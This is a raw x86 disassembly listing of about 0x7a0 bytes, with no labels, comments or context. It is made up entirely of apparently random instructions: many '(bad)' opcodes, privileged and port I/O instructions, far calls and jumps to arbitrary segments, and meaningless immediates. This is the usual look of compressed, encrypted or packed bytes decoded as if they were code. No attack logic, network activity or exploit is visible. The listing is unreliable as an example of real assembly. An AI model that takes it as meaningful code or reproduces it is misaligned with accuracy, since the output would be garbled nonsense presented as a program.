  4246f8:	cld    
  4246f9:	add    BYTE PTR [ebx],bh
  4246fb:	jp     0x42471f
  4246fd:	aaa    
  4246fe:	adc    DWORD PTR [eax+0x55],ebx
  424701:	aam    0xf2
  424703:	mov    ch,0xe
  424705:	xor    esp,esp
  424707:	mov    cl,0xf0
  424709:	bound  eax,QWORD PTR [ecx+0x8ffc046]
  42470f:	push   0xfffffffe
  424711:	jmp    0xff60622b
  424716:	and    esp,esi
  424718:	mov    eax,ds:0x5e8ee0
  42471d:	popf   
  42471e:	fdiv   QWORD PTR [ebp+edx*1+0x74]
  424722:	and    BYTE PTR [edx],0xff
  424725:	pop    ss
  424726:	mov    edx,0xd113da95
  42472b:	xchg   ecx,eax
  42472c:	ss adc al,0x72
  42472f:	xchg   ecx,eax
  424730:	push   cs
  424731:	cmovle edi,DWORD PTR [eax]
  424734:	or     ebp,DWORD PTR [esi+0x15]
  424737:	pop    ecx
  424738:	pusha  
  424739:	push   edi
  42473a:	mov    DWORD PTR [esi],edi
  42473c:	pop    es
  42473d:	inc    esi
  42473e:	(bad)  
  42473f:	ds or  edx,0xff7e05bf
  424746:	jge    0x424747
  424748:	jns    0x424702
  42474a:	add    bh,dh
  42474c:	add    BYTE PTR ss:[ebp-0x4c],dh
  424750:	add    BYTE PTR [ebp-0x72],cl
  424753:	adc    eax,0x62eef8e
  424758:	jo     0x424745
  42475a:	rcl    DWORD PTR [eax],cl
  42475c:	or     edx,DWORD PTR [eax+edx*2]
  42475f:	test   al,0xfe
  424761:	(bad)  
  424762:	mov    esi,0x6012282c
  424767:	popa   
  424768:	mov    al,ds:0xf05d2c1c
  42476d:	fistp  DWORD PTR [edx]
  42476f:	push   es
  424770:	ror    DWORD PTR [edx],1
  424772:	or     edi,edi
  424774:	cmp    dl,BYTE PTR [ebp-0x6c]
  424777:	ds sub al,0xe1
  42477a:	sub    ebx,DWORD PTR [esi]
  42477c:	adc    DWORD PTR [ecx-0x1],0xacb46
  424783:	dec    ecx
  424784:	mov    BYTE PTR [ebx-0x2b7cb895],dl
  42478a:	sub    al,0x45
  42478c:	pusha  
  42478d:	ret    
  42478e:	add    dl,BYTE PTR [eax-0x4e]
  424791:	mov    esp,0xbf788405
  424796:	inc    BYTE PTR [eax]
  424798:	cmp    eax,0xf6b7fffe
  42479d:	add    BYTE PTR ds:0xd05c35a1,dh
  4247a3:	repnz neg BYTE PTR [ebx+0x0]
  4247a7:	push   eax
  4247a8:	xchg   BYTE PTR [eax+esi*2],ch
  4247ab:	aam    0xc9
  4247ad:	mov    ah,0xa9
  4247af:	stos   DWORD PTR es:[edi],eax
  4247b0:	into   
  4247b1:	lods   al,BYTE PTR ds:[esi]
  4247b2:	xchg   BYTE PTR [ebx-0x7d933aea],ch
  4247b8:	stos   BYTE PTR es:[edi],al
  4247b9:	jb     0x42475c
  4247bb:	mov    ds:0x23e085a0,eax
  4247c0:	ss xchg esi,eax
  4247c2:	jno    0x4247c6
  4247c4:	sub    ebp,DWORD PTR [edx-0x16]
  4247c7:	adc    BYTE PTR [esi-0x4ed9abe4],0x70
  4247ce:	ds push eax
  4247d0:	ror    DWORD PTR [edx],1
  4247d2:	adc    al,0x58
  4247d4:	push   esp
  4247d5:	cmp    BYTE PTR [esi+0x60aa6af8],cl
  4247db:	pop    ebp
  4247dc:	cmp    ecx,DWORD PTR [edx]
  4247de:	inc    esi
  4247df:	stc    
  4247e0:	cmp    al,0x16
  4247e2:	fbld   TBYTE PTR [ebx+esi*2+0x2a1b600a]
  4247e9:	or     bh,BYTE PTR [edx]
  4247eb:	hlt    
  4247ec:	lods   al,BYTE PTR ds:[esi]
  4247ed:	pop    esp
  4247ee:	ficomp DWORD PTR [edx+0x3]
  4247f1:	inc    esp
  4247f2:	(bad)  
  4247f4:	push   eax
  4247f5:	push   eax
  4247f6:	push   ds
  4247f7:	int    0x2a
  4247f9:	jb     0x42478d
  4247fb:	std    
  4247fc:	retf   0x8772
  4247ff:	cmp    cl,BYTE PTR ds:0xaa15ad55
  424805:	retf   
  424806:	xor    al,0x20
  424808:	lods   al,BYTE PTR ds:[esi]
  424809:	dec    edi
  42480a:	adc    ah,al
  42480c:	xchg   edx,eax
  42480d:	jp     0x424851
  42480f:	or     cl,BYTE PTR [ebp+0x15]
  424812:	push   ss
  424813:	inc    esp
  424814:	add    al,0xe3
  424816:	fdivr  DWORD PTR ds:0xe6b58160
  42481c:	retf   0x94d2
  42481f:	sar    dl,cl
  424821:	es pushf 
  424823:	imul   edx
  424825:	push   0xffffffa8
  424827:	jp     0x4247e5
  424829:	xor    BYTE PTR [edx-0x137fe5da],cl
  42482f:	and    DWORD PTR [eax-0x7f],edx
  424832:	ins    DWORD PTR es:[edi],dx
  424833:	jbe    0x424807
  424835:	dec    esp
  424836:	inc    eax
  424837:	xor    BYTE PTR [ecx],cl
  424839:	rcl    bl,0xd1
  42483c:	push   eax
  42483d:	aam    0x24
  42483f:	cmp    bl,BYTE PTR [edi+ebx*1-0x7a]
  424843:	jbe    0x424829
  424845:	xchg   eax,edx
  424847:	inc    esp
  424848:	pop    ebx
  424849:	inc    ebx
  42484a:	mov    esp,0x32a6beb6
  42484f:	cmp    DWORD PTR [eax+0x5b4364d6],eax
  424855:	push   ecx
  424856:	aam    0x32
  424858:	push   esi
  424859:	sbb    bh,BYTE PTR [esi]
  42485b:	push   edx
  42485c:	sbb    eax,0x865f2ec1
  424861:	rcl    ecx,1
  424863:	sub    BYTE PTR [ecx+0x6b],dl
  424866:	mov    al,0xde
  424868:	pop    ecx
  424869:	nop
  42486a:	xor    eax,edi
  42486c:	clc    
  42486d:	(bad)  
  42486e:	ds imul ebp,DWORD PTR ds:[edi+ebx*4+0x7018ee],0xffffffaf
  424878:	scas   al,BYTE PTR es:[edi]
  424879:	(bad)  
  42487a:	repnz push 0x28
  42487d:	push   0xd
  42487f:	jp     0x42483e
  424881:	cs in  al,dx
  424883:	sub    al,0x90
  424885:	cwde   
  424886:	retf   
  424887:	add    ebp,DWORD PTR [eax]
  424889:	xor    ch,BYTE PTR [esi+eax*8-0x7f1f0ae]
  424890:	stos   DWORD PTR es:[edi],eax
  424891:	push   ecx
  424892:	rcl    BYTE PTR [ebp+ebp*4-0x20],1
  424896:	add    dh,BYTE PTR [edi+ecx*4]
  424899:	data16 adc BYTE PTR [edi+0x24],bl
  42489d:	bound  ecx,QWORD PTR [esi+0x48db0aaa]
  4248a3:	mov    WORD PTR [eax+0x3caea6dc],ds
  4248a9:	aam    0x18
  4248ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248ac:	and    BYTE PTR [esi-0x14db576],0x58
  4248b3:	clc    
  4248b4:	ss std 
  4248b6:	mov    BYTE PTR [ecx+ebx*8+0x6],dl
  4248ba:	aad    0x49
  4248bc:	jecxz  0x42484e
  4248be:	add    ah,cl
  4248c0:	pop    ds
  4248c1:	fdivr  QWORD PTR [edx+0x56ca14e8]
  4248c7:	je     0x4248ed
  4248c9:	push   es
  4248ca:	retf   0x6996
  4248cd:	cli    
  4248ce:	sub    BYTE PTR [ebp+0x522d5474],0x6a
  4248d5:	or     BYTE PTR [ecx],dl
  4248d7:	mul    DWORD PTR [edx*2+0x2fb4cfe4]
  4248de:	push   esp
  4248df:	je     0x424895
  4248e1:	mov    eax,ds:0xac5ac9a6
  4248e6:	pop    eax
  4248e7:	inc    edx
  4248e8:	rcl    DWORD PTR [esi],0x15
  4248eb:	xor    eax,0xe3565b32
  4248f0:	and    BYTE PTR ds:0x6ff38285,dl
  4248f6:	push   0xffffffb6
  4248f8:	mov    dh,0xa7
  4248fa:	nop
  4248fb:	mov    dl,0x4c
  4248fd:	sbb    eax,0xbe9f8e
  424902:	jl     0x424917
  424904:	add    BYTE PTR [esi],bh
  424906:	in     eax,0x15
  424908:	popf   
  424909:	ss push ebx
  42490b:	inc    ebp
  42490c:	cmp    dl,al
  42490e:	popa   
  42490f:	jno    0x42495e
  424911:	or     BYTE PTR [esi],ch
  424913:	push   edx
  424914:	inc    ecx
  424915:	sub    DWORD PTR [ebp-0x7a],0x857c4a7b
  42491c:	lds    esp,FWORD PTR [edx]
  42491e:	pop    edx
  42491f:	mov    al,ds:0x79a2a396
  424924:	inc    ecx
  424925:	ss or  al,0x86
  424928:	cli    
  424929:	add    BYTE PTR [edx-0x22],ch
  42492c:	cmp    dl,BYTE PTR [eax-0x4a]
  42492f:	test   eax,0xcae4a015
  424934:	inc    eax
  424935:	cld    
  424936:	les    edx,FWORD PTR [edx-0x411d241e]
  42493c:	sub    BYTE PTR [edx],dh
  42493e:	xor    eax,DWORD PTR [ebp+0x2622fcc7]
  424944:	push   esp
  424945:	adc    DWORD PTR [edx+0x2466eb5a],ebp
  42494b:	xchg   esp,eax
  42494c:	adc    al,0xac
  42494e:	mov    eax,ds:0x38244548
  424953:	aam    0x86
  424955:	add    dh,BYTE PTR [esi]
  424957:	add    al,0xb6
  424959:	sub    DWORD PTR [ebx],0xffffff8e
  42495c:	inc    esp
  42495d:	fcmovu st,st(6)
  42495f:	call   0x5204:0x2ffab2ad
  424966:	jecxz  0x4249e4
  424968:	dec    ebx
  424969:	sti    
  42496a:	add    BYTE PTR [edx+0x4ddbbfc4],dh
  424970:	lods   eax,DWORD PTR ds:[esi]
  424971:	imul   edx,DWORD PTR [edi],0x787ce8a0
  424977:	jmp    0xa2d5:0x4ee2f394
  42497e:	imul   ebp,DWORD PTR [ebx+0xa],0x8b6958de
  424985:	retf   0x7711
  424988:	into   
  424989:	pop    eax
  42498a:	aam    0xa2
  42498c:	(bad)  
  42498d:	outs   dx,BYTE PTR ds:[esi]
  42498e:	jb     0x4249e8
  424990:	xchg   esp,eax
  424991:	bound  ebx,QWORD PTR [esi-0x27]
  424994:	retf   
  424995:	pop    edx
  424996:	inc    ebx
  424997:	xchg   DWORD PTR [esi+eiz*2+0x3d],ecx
  42499b:	outs   dx,BYTE PTR ds:[esi]
  42499c:	mov    esi,edx
  42499e:	xchg   esp,eax
  42499f:	retf   0xac50
  4249a2:	jo     0x4249b9
  4249a4:	and    al,0xca
  4249a6:	repnz mov ?,esp
  4249a9:	pop    esp
  4249aa:	inc    eax
  4249ab:	or     cl,BYTE PTR [edx]
  4249ad:	call   0x2e16:0x613e5ead
  4249b4:	and    eax,0x775a91ae
  4249b9:	mov    fs,WORD PTR [ebx]
  4249bb:	inc    ebx
  4249bc:	sub    ebp,esi
  4249be:	addr16 clc 
  4249c0:	push   cs
  4249c1:	and    BYTE PTR [eax-0x4b],cl
  4249c4:	mov    eax,ds:0x2eb4d9a1
  4249c9:	mov    BYTE PTR [esi-0x31481952],cl
  4249cf:	add    eax,0x6b609195
  4249d4:	push   esi
  4249d5:	rol    BYTE PTR [edx+edi*8-0x6183f778],0xcb
  4249dd:	lock into 
  4249df:	ins    BYTE PTR es:[di],dx
  4249e1:	sub    ch,BYTE PTR [esp+eax*2-0x62]
  4249e5:	cs mov dl,0x57
  4249e8:	lock pop ecx
  4249ea:	test   al,0x15
  4249ec:	adc    al,0xb5
  4249ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249ef:	pop    edx
  4249f0:	pop    eax
  4249f1:	sub    esi,0xffffff80
  4249f4:	dec    edx
  4249f5:	in     al,dx
  4249f6:	ins    BYTE PTR es:[edi],dx
  4249f7:	or     al,0xab
  4249f9:	dec    ebx
  4249fa:	mov    ah,0xab
  4249fc:	call   0x6de77612
  424a01:	sbb    cl,BYTE PTR [esp+edx*1-0x52f2cb27]
  424a08:	push   eax
  424a09:	xor    edi,DWORD PTR [esi+ecx*1-0x2]
  424a0d:	out    dx,al
  424a0e:	jbe    0x4249d2
  424a10:	adc    DWORD PTR [ecx+0x41],esp
  424a13:	push   ebp
  424a14:	sbb    DWORD PTR [eax],0x6be42bd
  424a1a:	jmp    DWORD PTR [ebx-0x53d52eb0]
  424a20:	loopne 0x424a82
  424a22:	cs sbb dl,0xa
  424a26:	push   ds
  424a27:	mov    esi,0x26a6868c
  424a2c:	pop    ebx
  424a2d:	pusha  
  424a2e:	inc    eax
  424a2f:	cmp    dl,BYTE PTR [esi]
  424a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a32:	jo     0x424a50
  424a34:	popf   
  424a35:	out    0xc9,al
  424a37:	add    al,0xa2
  424a39:	xchg   BYTE PTR [edi+0x4c4a28da],dl
  424a3f:	sub    BYTE PTR [ebp+0x55],cl
  424a42:	lods   eax,DWORD PTR ds:[esi]
  424a43:	test   al,0x6a
  424a45:	int3   
  424a46:	outs   dx,BYTE PTR ds:[esi]
  424a47:	pushw  ss
  424a49:	push   ss
  424a4a:	fmul   DWORD PTR [eax+0x61a034ca]
  424a50:	or     DWORD PTR ds:0x3d4b0598,0x50
  424a57:	pop    ss
  424a58:	into   
  424a59:	jns    0x424a96
  424a5b:	sbb    bl,BYTE PTR [edx-0x79]
  424a5e:	dec    eax
  424a5f:	mov    ds:0x9ef78eaa,al
  424a64:	cld    
  424a65:	test   BYTE PTR [eax+0x3c],0xf6
  424a69:	scas   al,BYTE PTR es:[edi]
  424a6a:	sub    ch,BYTE PTR [ebx+0x7c]
  424a6d:	arpl   WORD PTR [edx+0x24],bp
  424a70:	lods   al,BYTE PTR ds:[esi]
  424a71:	xor    al,BYTE PTR [esi]
  424a73:	mov    bh,0x0
  424a75:	and    ch,al
  424a77:	adc    eax,0x3b8eb638
  424a7c:	mov    ah,0x83
  424a7e:	inc    esi
  424a7f:	ins    DWORD PTR es:[edi],dx
  424a80:	in     eax,dx
  424a81:	rcl    BYTE PTR [edx],0x3
  424a84:	fwait
  424a85:	pop    edi
  424a86:	mov    cl,0xa2
  424a88:	push   edx
  424a89:	std    
  424a8a:	jo     0x424a10
  424a8c:	test   esp,eax
  424a8e:	xchg   esi,eax
  424a8f:	add    cl,dh
  424a91:	js     0x424a93
  424a93:	clc    
  424a94:	jno    0x424add
  424a96:	inc    edx
  424a97:	mov    al,0xe3
  424a99:	sbb    DWORD PTR [edx-0xa2ce7bf],ecx
  424a9f:	dec    esi
  424aa0:	outs   dx,BYTE PTR ds:[esi]
  424aa1:	inc    ebx
  424aa2:	int    0xbf
  424aa4:	cli    
  424aa5:	es ret 
  424aa7:	add    BYTE PTR [ebp-0x11dfffa6],ah
  424aad:	dec    ecx
  424aae:	cmp    al,0x1b
  424ab0:	add    al,0x5
  424ab2:	sbb    eax,0x2d60d1ae
  424ab7:	push   esp
  424ab8:	push   0xd147dc4a
  424abd:	mov    ah,BYTE PTR [esi-0x6c]
  424ac0:	hlt    
  424ac1:	int3   
  424ac2:	hlt    
  424ac3:	xchg   ebx,eax
  424ac4:	(bad)  
  424ac7:	pop    edx
  424ac8:	push   ecx
  424ac9:	lods   eax,DWORD PTR gs:[esi]
  424acb:	jns    0x424b21
  424acd:	add    BYTE PTR [edx],bh
  424acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ad0:	les    edi,FWORD PTR fs:[ebx]
  424ad3:	mov    BYTE PTR [esi+eiz*2],ah
  424ad6:	fisub  DWORD PTR [esi-0x28]
  424ad9:	aad    0x78
  424adb:	in     al,dx
  424adc:	xchg   BYTE PTR ds:0x56a00e83,al
  424ae2:	fimul  DWORD PTR [eax+0x143455f3]
  424ae8:	mov    ah,dl
  424aea:	mov    ds:0x10735ccb,al
  424aef:	mov    ah,BYTE PTR [ebx-0x5b8a5760]
  424af5:	xor    eax,0x46c898a6
  424afa:	mov    WORD PTR [edx-0x5452b27e],?
  424b00:	add    al,dl
  424b02:	jp     0x424b61
  424b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b05:	and    ebx,esp
  424b07:	rcl    dh,0x6
  424b0a:	push   cs
  424b0b:	repz dec ebp
  424b0d:	add    eax,0xb616c8de
  424b12:	add    DWORD PTR [eax],0x57211af
  424b18:	dec    ebp
  424b19:	or     DWORD PTR [edx-0x1b59650f],0x40
  424b20:	adc    esp,DWORD PTR [esi+0x62]
  424b23:	sbb    eax,0xde054505
  424b28:	add    ah,BYTE PTR fs:[esi+ecx*2]
  424b2c:	cmp    DWORD PTR [eax+0x6cd11f8d],edx
  424b32:	inc    ebp
  424b33:	dec    edx
  424b34:	outs   dx,DWORD PTR ds:[esi]
  424b35:	sub    BYTE PTR [ecx+esi*8],bh
  424b38:	lods   eax,DWORD PTR ds:[esi]
  424b39:	cmp    bh,BYTE PTR [ebx]
  424b3b:	mov    ebx,0xac1a33
  424b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b41:	dec    ebp
  424b42:	lods   al,BYTE PTR ds:[esi]
  424b43:	cmp    BYTE PTR [ebx+0x4cd6c5c0],0x45
  424b4a:	sti    
  424b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b4c:	xchg   esp,eax
  424b4d:	jl     0x424ba8
  424b4f:	sbb    al,0x60
  424b51:	fbld   TBYTE PTR [edx+ebp*1+0x1a]
  424b55:	call   0x940e:0x800ee79
  424b5c:	mov    es,WORD PTR [edx]
  424b5e:	xchg   esi,eax
  424b5f:	mov    ?,WORD PTR [ecx]
  424b61:	add    eax,0xeedf3366
  424b66:	dec    cl
  424b68:	add    BYTE PTR [eax-0x3000e3e4],ch
  424b6e:	push   es
  424b6f:	callw  0xa3
  424b73:	pop    ebp
  424b74:	adc    al,0x57
  424b76:	psrad  mm3,QWORD PTR [ebp+0x3aa4f0e8]
  424b7d:	pop    edx
  424b7e:	stos   DWORD PTR es:[edi],eax
  424b7f:	call   0xe270551a
  424b84:	xchg   esp,eax
  424b85:	and    DWORD PTR [eax],ebp
  424b87:	jbe    0x424b0d
  424b89:	inc    edi
  424b8a:	mov    fs,WORD PTR [esi-0x58a1652a]
  424b90:	call   0x1eac:0xf41af4b6
  424b97:	push   esp
  424b98:	adc    BYTE PTR [edi],0xd8
  424b9b:	ss push edx
  424b9d:	mov    dl,0x84
  424b9f:	push   eax
  424ba0:	xor    al,0x0
  424ba2:	out    0xb2,al
  424ba4:	jle    0x424b34
  424ba6:	mov    al,BYTE PTR [esi+0x4c110e56]
  424bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bad:	mov    WORD PTR [edx],es
  424baf:	(bad)  
  424bb1:	push   ds
  424bb2:	adc    eax,0x42c50ad8
  424bb7:	ret    0x765e
  424bba:	fadd   QWORD PTR [ecx+0x75127816]
  424bc0:	push   ebp
  424bc1:	xor    eax,0x3244f654
  424bc6:	xor    al,0x9c
  424bc8:	(bad)  [eax+0x18]
  424bcb:	mov    al,ds:0xbea2aaa9
  424bd0:	mov    esi,0x3aaee47c
  424bd5:	mov    al,ds:0xd668ef23
  424bda:	mov    al,0x66
  424bdc:	mov    DWORD PTR [ebp-0x62],esi
  424bdf:	or     BYTE PTR [esi],dl
  424be1:	adc    BYTE PTR [eax+0x771ad2],ch
  424be7:	xchg   BYTE PTR ds:0x74987534,dh
  424bed:	push   es
  424bee:	add    edx,DWORD PTR [edx-0x25]
  424bf1:	xchg   BYTE PTR [eax-0x50],bh
  424bf4:	lods   eax,DWORD PTR ds:[esi]
  424bf5:	test   eax,0x789070a3
  424bfa:	and    BYTE PTR [edx],bh
  424bfc:	mov    eax,0xcac5c8a0
  424c01:	sub    ch,BYTE PTR [eax-0x1ddb1716]
  424c07:	xor    BYTE PTR [eax+ebx*8-0x7c],ch
  424c0b:	pop    edx
  424c0c:	cwde   
  424c0d:	shr    BYTE PTR [ebp+ebp*2+0x3e2bece8],1
  424c14:	cli    
  424c15:	mov    al,ds:0x76ac556a
  424c1a:	and    DWORD PTR [edx],ecx
  424c1c:	add    al,0x1b
  424c1e:	or     dl,BYTE PTR [edx-0x57]
  424c21:	sahf   
  424c22:	mov    dl,0x35
  424c24:	scas   al,BYTE PTR es:[edi]
  424c25:	pop    edx
  424c26:	xchg   esi,eax
  424c27:	fldcw  WORD PTR [edx-0x27ad6cfe]
  424c2d:	loopne 0x424c25
  424c2f:	jbe    0x424c9c
  424c31:	jo     0x424c3f
  424c33:	test   eax,0xcf34aaab
  424c38:	div    BYTE PTR [edx+esi*1-0x52b29491]
  424c3f:	inc    eax
  424c40:	inc    edx
  424c41:	js     0x424c67
  424c43:	loop   0x424c22
  424c45:	dec    esp
  424c46:	pop    ss
  424c47:	and    cl,BYTE PTR [eax+0x6cd6b682]
  424c4d:	inc    ecx
  424c4e:	dec    ecx
  424c4f:	sbb    BYTE PTR [ecx-0x9553b3],bl
  424c55:	push   ss
  424c56:	fwait
  424c57:	(bad)  
  424c58:	sub    al,0x1d
  424c5a:	sbb    eax,0xa6575d
  424c5f:	dec    esp
  424c60:	and    al,dh
  424c62:	push   ds
  424c63:	outs   dx,BYTE PTR ds:[esi]
  424c64:	push   0xffffffb2
  424c66:	inc    esi
  424c67:	or     bl,dl
  424c69:	mov    bl,0x76
  424c6b:	mov    esi,0xa8ea284e
  424c70:	sub    BYTE PTR [eax+0x54],ch
  424c73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c74:	popa   
  424c75:	test   WORD PTR [esi+eax*8-0x53ad9edc],cx
  424c7d:	fs push eax
  424c7f:	out    dx,eax
  424c80:	mov    cs,WORD PTR [ebp+edx*1-0x68]
  424c84:	outs   dx,DWORD PTR ds:[esi]
  424c85:	stos   BYTE PTR es:[edi],al
  424c86:	sub    BYTE PTR [ecx+0x34],dl
  424c89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c8a:	and    DWORD PTR [eax],eax
  424c8c:	cmp    cl,BYTE PTR [ebp+0x55550996]
  424c92:	xor    al,0x74
  424c94:	aam    0xc5
  424c96:	(bad)  
  424c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c99:	pop    esp
  424c9a:	cmp    al,0xe6
  424c9c:	sbb    eax,0x40a0a1b6
  424ca1:	xor    al,0x48
  424ca3:	xor    DWORD PTR [eax+eiz*2-0x166fc572],ecx
  424caa:	xchg   ebx,eax
  424cab:	sub    eax,0x9ea45d68
  424cb0:	retf   0x7e90
  424cb3:	push   cs
  424cb4:	je     0x424d1a
  424cb6:	loop   0x424ccd
  424cb8:	sbb    ebp,DWORD PTR [ecx+edx*2-0x68]
  424cbc:	adc    al,0x74
  424cbe:	jecxz  0x424c42
  424cc0:	jp     0x424c56
  424cc2:	jge    0x424d22
  424cc4:	inc    ebx
  424cc5:	or     cl,BYTE PTR [edx+0x7e541c0a]
  424ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ccc:	cwde   
  424ccd:	jo     0x424c95
  424ccf:	inc    edi
  424cd0:	aam    0xd1
  424cd2:	sbb    cl,BYTE PTR [edx]
  424cd4:	pop    edx
  424cd5:	xor    al,BYTE PTR [edx]
  424cd7:	mul    BYTE PTR [esp+ebp*8-0x7c]
  424cdb:	ftst   
  424cdd:	fcom   DWORD PTR [eax-0x2b]
  424ce0:	sub    BYTE PTR ds:0xd5d443f6,bh
  424ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ce7:	add    BYTE PTR [edx-0x4b],al
  424cea:	sar    DWORD PTR [edx],0x36
  424ced:	clc    
  424cee:	mov    cs,eax
  424cf0:	(bad)  
  424cf2:	nop
  424cf3:	shl    DWORD PTR ds:0xa716a8b0,cl
  424cf9:	aam    0xa3
  424cfb:	sub    eax,0xd1fa92e4
  424d00:	gs pop ebx
  424d02:	push   ebp
  424d03:	and    bh,ah
  424d05:	(bad)  
  424d06:	cmp    BYTE PTR [ebx],0x29
  424d09:	mov    esi,0xd55950b6
  424d0e:	push   esi
  424d0f:	push   ecx
  424d10:	loop   0x424cfa
  424d12:	call   0x6d8:0x36d33a10
  424d19:	jbe    0x424cbe
  424d1b:	test   eax,0x9352a3ab
  424d20:	push   ds
  424d21:	mov    esp,0xc7dc5ece
  424d26:	ret    
  424d27:	lods   al,BYTE PTR ds:[si]
  424d29:	cli    
  424d2a:	mov    cx,0x5800
  424d2e:	in     al,0x41
  424d30:	pop    ss
  424d31:	jmp    0xbb6:0xaaa886d
  424d38:	ss mov esi,0xeade488d
  424d3e:	add    BYTE PTR ds:0x54b50976,cl
  424d44:	hlt    
  424d45:	stos   DWORD PTR es:[edi],eax
  424d46:	stos   BYTE PTR es:[edi],al
  424d47:	test   al,0xc3
  424d49:	call   0xc6c0:0xbf3eddf0
  424d50:	mov    ch,0xa8
  424d52:	mov    al,ds:0x3a45aaa2
  424d57:	xchg   edi,eax
  424d58:	fimul  WORD PTR [edx]
  424d5a:	(bad)  
  424d5b:	icebp  
  424d5c:	jb     0x424d8a
  424d5e:	enter  0x1ed1,0x18
  424d62:	gs out dx,al
  424d64:	sbb    ecx,DWORD PTR [eax+ebp*1]
  424d67:	pop    eax
  424d68:	fist   DWORD PTR [eax+0x4]
  424d6b:	fidiv  DWORD PTR [eax+0x54405a0e]
  424d71:	cli    
  424d72:	xor    dh,BYTE PTR [ebp+0x2e164d45]
  424d78:	daa    
  424d79:	sub    al,0xe6
  424d7b:	or     bh,BYTE PTR [esp+ebx*4-0x66]
  424d7f:	xor    BYTE PTR [ebp+0x1dc46868],ch
  424d85:	cmp    BYTE PTR [eax-0x5800836],ah
  424d8b:	or     bl,BYTE PTR [edx+0x7d8668ed]
  424d91:	nop
  424d92:	fsubr  st(1),st
  424d94:	adc    al,dl
  424d96:	lods   al,BYTE PTR ds:[esi]
  424d97:	jb     0x424d8c
  424d99:	imul   ebp,eax,0x5a
  424d9c:	rcl    BYTE PTR [eax],1
  424d9e:	pop    es
  424d9f:	sbb    cl,bh
  424da1:	add    eax,0x7402aeb0
  424da6:	ror    BYTE PTR [edi-0x45fd7d7a],1
  424dac:	jmp    0x369c:0xe4141e54
  424db3:	mov    ch,0xf6
  424db5:	mov    WORD PTR [esi],ss
  424db7:	ss cli 
  424db9:	loop   0x424dd0
  424dbb:	push   ss
  424dbc:	ror    BYTE PTR [eax+ebx*2+0x27],1
  424dc0:	push   ss
  424dc1:	scas   al,BYTE PTR es:[edi]
  424dc2:	adc    eax,0x395246cd
  424dc7:	adc    BYTE PTR [edi-0x1cfb55e6],ah
  424dcd:	sub    ebx,DWORD PTR [edx]
  424dcf:	cmp    dl,BYTE PTR [esi+ebx*8-0x4a]
  424dd3:	les    ecx,FWORD PTR [eax+0x7b006fe9]
  424dd9:	data16 mov dl,0xcd
  424ddc:	ds test eax,0x55834c0
  424de2:	and    BYTE PTR [eax+0xa],al
  424de5:	cld    
  424de6:	imul   esi,DWORD PTR [edx+ebx*4],0xa
  424dea:	pop    edx
  424deb:	imul   edx,esi,0xffffff9b
  424dee:	loop   0x424e07
  424df0:	mov    al,ds:0x2e137e11
  424df5:	xchg   ebp,eax
  424df6:	pop    edx
  424df7:	ret    
  424df8:	add    bl,bl
  424dfa:	inc    eax
  424dfb:	aas    
  424dfc:	dec    eax
  424dfd:	push   edx
  424dfe:	cld    
  424dff:	mov    ch,BYTE PTR [esi+ebp*2-0x66]
  424e03:	jbe    0x424e0b
  424e05:	mov    edx,DWORD PTR [ebx+ebp*2+0x1a]
  424e09:	mov    WORD PTR [esi],ss
  424e0b:	bound  ebx,QWORD PTR [esi+0x30]
  424e0e:	test   al,0xd9
  424e10:	push   es
  424e11:	xchg   ebp,eax
  424e12:	push   cs
  424e13:	xor    BYTE PTR [esi],cl
  424e15:	push   esi
  424e16:	push   eax
  424e17:	sbb    al,0x34
  424e19:	adc    ah,BYTE PTR [eax+0x68ad8012]
  424e1f:	cmc    
  424e20:	fadd   st(2),st
  424e22:	cmp    BYTE PTR ds:[edx],ch
  424e25:	js     0x424dee
  424e27:	xor    DWORD PTR [eax],0xffffffd2
  424e2a:	in     al,0x8d
  424e2c:	cli    
  424e2d:	add    cl,al
  424e2f:	(bad)  
  424e31:	fs sbb eax,0x241ea9b6
  424e37:	aad    0xd6
  424e39:	cs scas al,BYTE PTR es:[edi]
  424e3b:	outs   dx,BYTE PTR ds:[esi]
  424e3c:	fsubr  QWORD PTR [eax+0x28]
  424e3f:	test   al,0xb0
  424e41:	hlt    
  424e42:	and    dh,BYTE PTR [eax]
  424e44:	js     0x424e26
  424e46:	sbb    cl,al
  424e48:	mov    cl,0xc1
  424e4a:	sub    al,0x60
  424e4c:	leave  
  424e4d:	inc    edi
  424e4e:	xor    dl,BYTE PTR [ebx-0x2]
  424e51:	cmp    al,0xa8
  424e53:	sub    dh,BYTE PTR [eax+0x14]
  424e56:	dec    eax
  424e57:	fisttp DWORD PTR [esi-0x10]
  424e5a:	jbe    0x424e8c
  424e5c:	in     al,0x98
  424e5e:	mov    eax,ds:0x8a0448ed
  424e64:	sbb    al,0x30
  424e66:	sahf   
  424e67:	scas   al,BYTE PTR es:[edi]
  424e68:	push   ds
  424e69:	sar    BYTE PTR [edx],1
  424e6b:	push   esi
  424e6c:	je     0x424ec3
  424e6e:	shl    BYTE PTR [ecx-0x74],1
  424e71:	clc    
  424e72:	inc    esi
  424e73:	xlat   BYTE PTR ds:[ebx]
  424e74:	ins    DWORD PTR es:[edi],dx
  424e75:	cld    
  424e76:	xchg   edx,eax
  424e77:	leave  
  424e78:	push   esi
  424e79:	adc    al,0x19
  424e7b:	pop    esp
  424e7c:	xor    al,al
  424e7e:	mov    dl,0xe0
  424e80:	push   cs
  424e81:	shr    BYTE PTR [eax-0x50],1
  424e84:	lods   eax,DWORD PTR ds:[esi]
  424e85:	test   al,0x6a
  424e87:	adc    edx,eax
  424e89:	fwait
  424e8a:	hlt    
  424e8b:	adc    al,0x3a
  424e8d:	mov    BYTE PTR [eax+0x7a],ch
  424e90:	(bad)  
  424e91:	call   0xad20:0x26fcec5a
  424e98:	loope  0x424e5e
  424e9a:	lods   eax,DWORD PTR ds:[esi]
